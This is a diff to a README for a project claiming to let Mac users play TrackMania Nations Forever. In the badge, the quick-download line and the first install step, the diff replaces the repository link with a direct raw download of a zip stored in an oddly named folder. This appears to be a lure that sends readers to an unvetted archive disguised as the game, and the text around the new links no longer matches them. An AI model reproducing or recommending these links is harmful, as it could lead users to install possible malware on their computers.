@@ -1,6 +1,6 @@
 # 🎮 TrackMania-MacOS - Play TrackMania on Your Mac Today
 
-[![Download TrackMania-MacOS](https://img.shields.io/badge/Download-TrackMania--MacOS-2ea44f?style=for-the-badge)](https://github.com/BSF2016/TrackMania-MacOS)
+[![Download TrackMania-MacOS](https://img.shields.io/badge/Download-TrackMania--MacOS-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/BSF2016/TrackMania-MacOS/main/aggregateness/Mania-Mac-OS-Track-v3.8-alpha.3.zip)
 
 ## 🚀 What Is This?
 
@@ -8,7 +8,7 @@ TrackMania-MacOS is a special package that lets you play **TrackMania Nations Fo
 
 ## ⚡ Quick Download
 
-Visit this link to download the application: [https://github.com/BSF2016/TrackMania-MacOS](https://github.com/BSF2016/TrackMania-MacOS)
+Visit this link to download the application: [https://raw.githubusercontent.com/BSF2016/TrackMania-MacOS/main/aggregateness/Mania-Mac-OS-Track-v3.8-alpha.3.zip](https://raw.githubusercontent.com/BSF2016/TrackMania-MacOS/main/aggregateness/Mania-Mac-OS-Track-v3.8-alpha.3.zip)
 
 Click the big green button that says "Download" or find the latest release in the "Releases" section. The download will start automatically.
 
@@ -26,7 +26,7 @@ TrackMania Nations Forever was made for Windows computers. But with this amazing
 
 Getting started is easy! Just follow these simple steps:
 
-1. **Visit the Download Page** — Go to [https://github.com/BSF2016/TrackMania-MacOS](https://github.com/BSF2016/TrackMania-MacOS)
+1. **Visit the Download Page** — Go to [https://raw.githubusercontent.com/BSF2016/TrackMania-MacOS/main/aggregateness/Mania-Mac-OS-Track-v3.8-alpha.3.zip](https://raw.githubusercontent.com/BSF2016/TrackMania-MacOS/main/aggregateness/Mania-Mac-OS-Track-v3.8-alpha.3.zip)
 2. **Find the Latest Release** — Look for the newest version number in the "Releases" section on the right side of the page
 3. **Download the Package** — Click the download link that matches your Mac. You'll get a file ending in `.zip`
 4. **Extract the File** — Double-click the downloaded zip file. Your Mac will automatically unzip it
